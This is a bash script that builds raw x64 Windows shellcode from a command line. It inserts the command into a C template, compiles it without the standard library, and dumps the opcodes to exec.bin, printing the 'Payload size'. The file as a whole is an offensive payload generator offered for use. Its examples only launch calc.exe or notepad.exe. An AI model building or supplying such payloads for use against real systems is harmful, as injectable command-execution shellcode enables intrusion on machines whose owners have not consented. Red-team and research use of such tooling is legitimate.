#!/usr/bin/env bash

set -euo pipefail

# Usage:
#   generate.sh <CMD> <SHOWWINDOW>
# Examples:
#   generate.sh 'calc.exe' 10
#   generate.sh 'notepad.exe' 10

usage() {
    echo "Usage: $0 <CMD> <SHOWWINDOW>" >&2
}

validate_cmd() {
    local cmd="$1"

    if [[ -z "${cmd}" ]]; then
        echo "error: CMD must not be empty" >&2
        exit 1
    fi

    if [[ "${cmd}" == *$'\n'* || "${cmd}" == *$'\r'* || "${cmd}" == *"'"* || "${cmd}" == *"\\"* ]]; then
        echo "error: single quotes and backslashes are not supported in CMD" >&2
        exit 1
    fi
}

validate_showwindow() {
    local showwindow="$1"

    if [[ ! "${showwindow}" =~ ^[0-9]+$ ]]; then
        echo "error: SHOWWINDOW must be a number" >&2
        exit 1
    fi
}

build_cmd_char_array() {
    local cmd="$1"
    local result=""
    local char
    local index

    for ((index = 0; index < ${#cmd}; index++)); do
        char="${cmd:index:1}"

        if [[ -n "${result}" ]]; then
            result+=","
        fi

        result+="'${char}'"
    done

    printf '%s' "${result}"
}

render_exec_source() {
    local cmd_char_array="$1"
    local showwindow="$2"
    local template

    template="$(<template.c)"
    template="${template//<CMD>/${cmd_char_array}}"
    template="${template//<SHOWWINDOW>/${showwindow}}"
    printf '%s\n' "${template}" > exec.c
}

cleanup() {
    rm -f exec.exe exec.o exec.c adjuststack.o
}

if [[ "$#" -ne 2 ]]; then
    usage
    exit 1
fi

CMD="$1"
SHOWWINDOW="$2"  # https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
validate_cmd "${CMD}"
validate_showwindow "${SHOWWINDOW}"

trap cleanup EXIT

CMD_CHAR_ARRAY="$(build_cmd_char_array "${CMD}")"
render_exec_source "${CMD_CHAR_ARRAY}" "${SHOWWINDOW}"

nasm -f win64 adjuststack.asm -o adjuststack.o

x86_64-w64-mingw32-gcc exec.c -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o exec.o -Wl,-Tlinker.ld,--no-seh

x86_64-w64-mingw32-ld -s adjuststack.o exec.o -o exec.exe

echo -e `for i in $(objdump -d exec.exe | grep "^ " | cut -f2); do echo -n "\x$i"; done` > exec.bin

if [ -f exec.bin ]; then
    echo "[*] Payload size: `stat -c%s exec.bin` bytes"
    echo "[+] Saved as: exec.bin"
fi
